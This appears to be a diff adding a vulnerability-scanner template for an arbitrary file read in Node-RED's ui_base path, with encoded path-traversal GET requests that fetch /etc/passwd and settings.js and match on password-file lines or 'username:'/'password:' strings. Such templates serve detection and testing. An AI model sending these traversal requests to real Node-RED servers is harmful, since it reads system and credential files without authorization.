@@ -1,0 +1,13 @@
+name: Node-RED-ui_base-Anyfileread
+rules:
+  r0:
+    request:
+      method: GET
+      path: /ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+  r1:
+    request:
+      method: GET
+      path: /ui_base/js/..%2f..%2f..%2f..%2fsettings.js
+    expression: response.status == 200 && response.body.bcontains(b'username:') && response.body.bcontains(b'password:')
+expression: r0() || r1()
